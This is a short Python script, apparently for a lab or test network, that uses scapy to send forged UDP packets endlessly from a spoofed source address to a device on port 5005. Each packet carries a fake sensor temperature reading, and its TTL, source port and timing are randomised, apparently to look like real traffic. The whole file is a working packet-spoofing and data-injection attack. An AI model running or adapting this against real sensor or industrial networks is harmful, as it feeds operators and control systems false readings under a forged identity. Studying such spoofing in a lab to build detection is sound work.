from scapy.all import IP, UDP, Raw, send
import time, random

while True:
    try:
        pkt = IP(src='192.168.10.40', dst='192.168.10.50', ttl=random.randint(50, 60)) / \
              UDP(sport=random.randint(10000, 60000), dport=5005) / \
              Raw(load=b'sensor:spoofed:temp:22.4')
        send(pkt, verbose=False)
        print('spoofed packet sent', flush=True)
    except Exception as e:
        print(f'error: {e}', flush=True)
    time.sleep(random.uniform(1.5, 3.5))